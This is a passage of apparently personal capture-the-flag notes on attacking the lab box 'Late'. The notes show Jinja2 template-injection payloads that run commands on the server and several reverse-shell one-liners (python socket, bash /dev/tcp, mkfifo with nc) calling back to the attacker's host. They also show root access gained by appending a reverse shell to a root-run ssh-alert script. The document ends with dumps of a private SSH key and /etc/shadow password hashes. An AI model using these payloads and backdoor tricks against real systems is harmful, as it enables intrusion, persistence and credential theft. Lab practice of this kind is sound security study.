W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
`
tried to fix invalid format: no luck so far with enters, removing \n as I have before, etc.. weird

looks like my web shell is minimally efficient also, lots of folders not working, / not always working right

changed / to // and same thing, some work, some dont..

tried quickly just dropping to this shell
`
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.47",4464));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
`
or, without python -c maybe?
`
exploitcmd=
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.47",4464));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
`
`
bash -i >& /dev/tcp/10.10.14.47/4464 0>&1
`
No luck.    Went back to the id_rsa format issue, maybe I can search on this:

Starting openssh 7.6, it defaults to a new more secure format. You can force it to convert to that format using the commands below to change your key password. In case you don't have and/or don't want a password, you can simply press enter and it will still rewrite the key in the new format
ssh-keygen -f id_rsa -p

Tried cracking it first.. I think there is a translation problem here, not a valid key file for ssh2john.py either...

So, I can maybe try a quick nc shell lol, thought of it while trying to think of a way to copy id_rsa.. which nc worked

but, can't get nc 10.10.14.47 4464 -e /bin/bash to work

Still cant get back to my box on 4464, tried 443:
`
bash -i >& /dev/tcp/10.10.14.47/443 0>&1
`
no luck there either.  Tried grabbing the user flag as i need to at least get this.. Maybe a break will help

CMD (or 'exit')> cat ../user.txt
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('cat ../user.txt').read() }}
a4c1dec55450dacf59b6c0e5b12781d2

Found a way around the slashes in navigation, kind of??
`
CMD (or 'exit')> cd templates ; cat result.html
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('cd templates ; cat result.html').read() }}
{% include &#34;header.html&#34; %}

{% block body %}
    <div class=&#34;container&#34;>
        <br>
        <br>
        <h1>Results</h1>
        <hr>

        <h2>Information</h2>
        <p>Words: {{ words }}</p>
        <p>Scan time: {{ time }} seconds</p>
        <hr>

        <h2>Extracted text</h2>
        <p>{{ text }}</p>
    </div>
{% endblock body %}

{% include &#34;footer.html&#34; %}
`
used this to grab the pub_key!! yay
`
CMD (or 'exit')> cd ../.ssh ; cat id_rsa.pub
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('cd ../.ssh ; cat id_rsa.pub').read() }}
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp7ldYUpWqV4LJ/M+jgex9FHy4X8//dOf5+IBQeGca8EEDKsweI/dL8Oep0gfa6pNd0+Th4Z1fKfMycVHNthv5wFr5HxP+dNrc9K5H22SKqFdNoQ5uCNFLKevY24NY9CFfw6aEAp0mFl8StlRxvGK6dysqegKVktDplkNo1O1NTClRoyL+a1ofMsgPUpOX51QWwtBiZ1FQDrf3GTPVi8MXk5sgOh4eA5TutlXhOoDqzqAjtbt3Xfszc6LZZNZEHNxZMAzB9InZwS229L8CcT8HYR6WPWyFhRm4/IiguFIyJwaeEHvsgqll5D4yCSxFwcnl8naG9O79PfIv22CB/0Ox svc_acc@late
`

Can't do much with this either, asks for password
`
CMD (or 'exit')> lsb_release -a
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('lsb_release -a').read() }}
Distributor ID:	Ubuntu
Description:	Ubuntu 18.04.5 LTS
Release:	18.04
Codename:	bionic
`
Made sure I'm able to at least ping my host, yup:
`
┌─[root@parrotLT]─[/h/late]
└──╼ #tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:06:58.713219 IP late > 10.10.14.47: ICMP echo request, id 10232, seq 1, length 64
10:06:58.713269 IP 10.10.14.47 > late: ICMP echo reply, id 10232, seq 1, length 64
10:06:59.708415 IP late > 10.10.14.47: ICMP echo request, id 10232, seq 2, length 64
10:06:59.708464 IP 10.10.14.47 > late: ICMP echo reply, id 10232, seq 2, length 64
10:07:00.710278 IP late > 10.10.14.47: ICMP echo request, id 10232, seq 3, length 64
10:07:00.710326 IP 10.10.14.47 > late: ICMP echo reply, id 10232, seq 3, length 64
`
see if I can hit my port 4424:
`nc -lvp 4424  # my side
echo hi | nc 10.10.14.47 4424
`
yup, working:
`
└──╼ #4424 id_rsa2
listening on [any] 4424 ...
connect to [10.10.14.47] from late [10.10.11.156] 33246
^C
┌─[✗]─[root@parrotLT]─[/h/late/ImageReader]
└──╼ #cat id_rsa2
hi
`

so, I should be able to send id_rsa ??

Still not working..  Verified what I had with ssh-keygen:
`
┌─[root@parrotLT]─[/h/late]
└──╼ #ssh-keygen -l -f id_rsa
2048 SHA256:1KD/tiC8jB35o+21qOhTPDP8xfclOHf9C+U2p6gfjpc svc_acc@late (RSA)
`
Shows a good signature it looks like, sha256... Searched and not sure, might come back to it once more.. seems to look okay, but I'm guessing there are some chars that don't decode from base64 properly

Downloaded a .pyc file and noticed this, probably nothing though:
`secret_key�routerr6rrrr<module>s`

Saved  a couple variations in passwd.txt but .. moving on for now, need this id_rsa

Tried just base64 ing it and saving to another file:

`
CMD (or 'exit')> cat ../.ssh/id_rsa | base64 > a
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('cat ../.ssh/id_rsa | base64 > a').read() }}


CMD (or 'exit')> ls -lsaF
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('ls -lsaF').read() }}
total 44
4 drwxrwxr-x 7 svc_acc svc_acc 4096 May  8 17:21 ./
4 drwxr-xr-x 7 svc_acc svc_acc 4096 May  8 00:56 ../
4 -rw-r--r-- 1 svc_acc svc_acc 2270 May  8 17:21 a
4 -rw-r--r-- 1 svc_acc svc_acc 1765 Apr  4 12:58 main.py
4 -rw-r--r-- 1 svc_acc svc_acc 2192 May  7 21:42 main.pyc
4 drwxr-xr-x 2 svc_acc svc_acc 4096 May  8 17:21 misc/
4 drwxr-xr-x 2 root    root    4096 Apr  4 12:59 __pycache__/
4 drwxr-xr-x 7 svc_acc svc_acc 4096 Jan  6 11:17 static/
4 drwxr-xr-x 2 svc_acc svc_acc 4096 Jan  6 11:17 templates/
4 drwxr-xr-x 2 svc_acc svc_acc 4096 May  8 17:21 uploads/
4 -rw-r--r-- 1 svc_acc svc_acc  104 Apr  4 12:58 wsgi.py


CMD (or 'exit')> cat a
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('cat a').read() }}
<long base64>
`
Looks good, base64 -d's perfectly:
`
┌─[root@parrotLT]─[/h/late]
└──╼ #cat id_rsa3.base64 | base64 -d >id_rsa3
`
Still asking for pw:
`
└──╼ #ssh -i id_rsa3 svc_acc@late.htb
svc_acc@late.htb's password: 
`
Tried cracking with john:   hmmm,
 `
└──╼ #python2.7 /usr/share/john/ssh2john.py id_rsa3
id_rsa3 has no password!
`
So, maybe this isn't the correct password, why is ssh asking for a pw then???

Tried this one:
`
app.secret_key = b'_5#y2L&#34;F4Q8z\n\xec]/'
_5#y2L&#34;F4Q8z\n\xec]/
`
ugh, this looks like it will have some bad chars in it, but lets try..

ahh crap, bad formatting.  &#34; is another char: checked in cyberchef as urldecode sites aren't showing me, this is an HTML entitycode actually, oops, I should know the difference at this point..

![htmlentity](cmdexec1-htmentity.png "htmlentity")

So, From_HTML_Entity() was the recipe, awesome.  Did another replace in the python script and got to fix all the stuff above that wasn't working so far as far as cat certain files in longer paths, etc.. 

So password is:  `_5#y2L"F4Q8z\n\xec]/`
But, this is not svc_acc password, or root password via ssh..

Now lets try the rev shell:
`
bash -i >& /dev/tcp/10.10.14.47/4464 0>&1
`
Finallly found a payload that worked !@$!@$!@$!@$!@%!@%! 
`
rm A; mkfifo A; cat A | /bin/sh -i 2>&1 | nc 10.10.14.47 4464 > A

CMD (or 'exit')> rm A; mkfifo A; cat A | /bin/sh -i 2>&1 | nc 10.10.14.47 4464 > A
[ Tried:	tesseractSux {{ joiner.__init__.__globals__.os.popen('rm A; mkfifo A; cat A | /bin/sh -i 2>&1 | nc 10.10.14.47 4464 > A').read() }}
<html><head><title>502 Bad Gateway</title></head><body bgcolor="white"><center><h1>502 Bad Gateway</h1></center><hr><center>nginx/1.14.0 (Ubuntu)</center></body></html>
`
So a working payload from a screenshot would be:
`
tesseractSux {{ joiner.__init__.__globals__.os.popen('rm A; mkfifo A; cat A | /bin/sh -i 2>&1 | nc 10.10.14.47 4464 > A').read() }}
`
Left a fun little note in /tmp

![note](cmdexec2-note.png "note")

already found cron is the way it looks like, due to the crap left in /tmp, ugh.. Well, maybe.  oh well at this point I dont mind. lets see what we have.

Hit up a quick python pty shell:  
`python -c 'import pty; pty.spawn("/bin/bash")'
<ctrl-z> stty -a ; stty raw -echo ; fg   <xterm-256color>`

:: PrivEsc

looked into the normal stuff, sudo -l , su -, crontab -l etc, nothing..
Looked at ports and processes. nothing standing out, 1 script maybe.. its user owned though, started a linpeas:

:: linpeas


Didn't really find anything much in here, checked on a couple small things, but not much was found..

Tried making an msf binary, and exploit suggester.. None found:

[*] 10.10.11.156 - Collecting local exploits for x64/linux...
[-] 10.10.11.156 - No suggestions available.
[*] Post module execution completed

Noticed that /usr/local/sbin is red everywhere in the linpeas output, checked this out, found a script:

svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

This looks likely to be a privesc, if run as root, but probably a rabbithole..

:: ssh-alert.sh
`
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
`
---

Looks like I can just add a line to this and try an ssh login, lolezpwn if so.  Tried:
`
echo 'bash -i >& /dev/tcp/10.10.14.47/4454 0>&1' >>ssh-alert.sh
`
nope, not executing as I can't login to ssh to trigger it.  Seems like that will be the thing at this point..

Did find a post about decrypting secrets frmo pyc files: But I think its a rabbithole
https://blog.jse.li/posts/pyc/

Looked back at the ssh login.  I think its not an authorized key, duh and this is the problem.  Others have added their stuff to authorized keys..

:: Day3
I didn't even add my key to authorized keys but today when I added the line below,the shell popped?  Weird, not sure, maybe someone else ssh'd in, lol
`
echo 'bash -i >& /dev/tcp/10.10.14.47/4434 0>&1' >>ssh-alert.sh
`
Ugh, this is the 2nd time recently that I have put extra hours into a htb box, and it just needed to be reset. Not cool
`
cat /root/root.txt
cc5e6472963a78f258e4aa861e6218f2

cat /etc/shadow
root:$6$a6J2kmTW$cHVk8PYFcAiRyUOA38Cs1Eatrz48yp395Cmi7Fxszl/aqQooB.6qFmhMG1LYuHJpGvvaE1cxubWIdIc1znRJi.:19089:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18997:0:99999:7:::
svc_acc:$6$/WRA.GuP$fusYGh.OucHDQzn5.9XdFMO6hcVw7ayD1B9/MVrxKFyv0PDd51.3JUA9qgQMU1Mnvlfjw9xSDb98B1xMwdtZH.:19008:0:99999:7:::
rtkit:*:18997:0:99999:7:::
usbmux:*:18997:0:99999:7:::
avahi:*:18997:0:99999:7:::
cups-pk-helper:*:18997:0:99999:7:::
saned:*:18997:0:99999:7:::
colord:*:18997:0:99999:7:::
pulse:*:18997:0:99999:7:::
geoclue:*:18997:0:99999:7:::
smmta:*:19006:0:99999:7:::
smmsp:*:19006:0:99999:7:::
`



